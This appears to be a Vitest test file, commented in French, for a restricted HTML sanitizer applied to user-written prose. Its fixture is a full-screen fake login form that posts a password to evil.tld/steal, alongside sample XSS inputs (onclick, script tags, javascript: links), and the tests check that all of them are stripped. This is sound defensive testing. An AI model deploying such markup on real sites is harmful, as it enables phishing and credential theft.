import { describe, it, expect } from "vitest";
import { sanitize, sanitizeProse } from "./sanitize";

/**
 * `sanitizeProse` est le profil de la prose saisie par N'IMPORTE QUEL
 * utilisateur (`ProseContent`). Le défaut à ne pas réintroduire n'est pas un
 * script : c'est un faux écran de connexion plein écran, dessiné avec du HTML
 * parfaitement « sûr » aux yeux du profil DOMPurify par défaut.
 */
const FAUX_LOGIN =
  '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;z-index:99999">' +
  '<form action="https://evil.tld/steal"><input type="password" name="pwd"><button>Se connecter</button></form></div>';

describe("sanitizeProse — profil restreint pour la prose utilisateur", () => {
  it("retire les contrôles de formulaire (form, input, button, select, textarea)", () => {
    const out = sanitizeProse(FAUX_LOGIN + "<select><option>a</option></select><textarea>t</textarea>");
    for (const tag of ["form", "input", "button", "select", "option", "textarea"]) {
      expect(out).not.toMatch(new RegExp(`<${tag}[\\s>]`, "i"));
    }
    // Le texte survit : on retire la balise, pas ce qu'elle contient.
    expect(out).toContain("Se connecter");
  });

  it("retire les crochets de mise en page : style, class, id", () => {
    const out = sanitizeProse('<p style="position:fixed" class="fixed inset-0 z-50" id="main">x</p>');
    expect(out).toBe("<p>x</p>");
  });

  it("retire <dialog> (positionné en absolu par la feuille de style navigateur) et le SVG", () => {
    expect(sanitizeProse("<dialog open>hey</dialog>")).toBe("hey");
    expect(sanitizeProse('<svg width="10000" height="10000"><rect/></svg>fin')).toBe("fin");
  });

  it("retire les attributs data-*", () => {
    expect(sanitizeProse('<p data-state="open">x</p>')).toBe("<p>x</p>");
  });

  it("garde ce qu'une prose utilise vraiment : titres, listes, liens, images, gras, code", () => {
    const html =
      '<h2>Titre</h2><ul><li><strong>a</strong></li></ul><a href="https://x.org" rel="noopener">l</a>' +
      '<img src="https://x.org/i.png" alt="i"><code>c</code><br>';
    expect(sanitizeProse(html)).toBe(html);
  });

  it("reste un vrai sanitiseur XSS (script, handler inline, javascript:)", () => {
    const out = sanitizeProse('<p onclick="x()">a</p><script>b()</script><a href="javascript:c()">l</a>');
    expect(out).not.toContain("script");
    expect(out).not.toContain("onclick");
    expect(out).not.toContain("javascript:");
  });

  it("ne déteint pas sur `sanitize()` — le profil par défaut reste permissif pour la config admin", () => {
    // `normalizeSiteConfig.js` applique le profil par défaut aux sections
    // `html`/`content` : un `style` posé par l'admin du site doit y survivre,
    // même après un appel à `sanitizeProse` sur la même instance DOMPurify.
    sanitizeProse(FAUX_LOGIN);
    expect(sanitize('<div style="color:red" class="x">y</div>')).toBe('<div style="color:red" class="x">y</div>');
  });
});
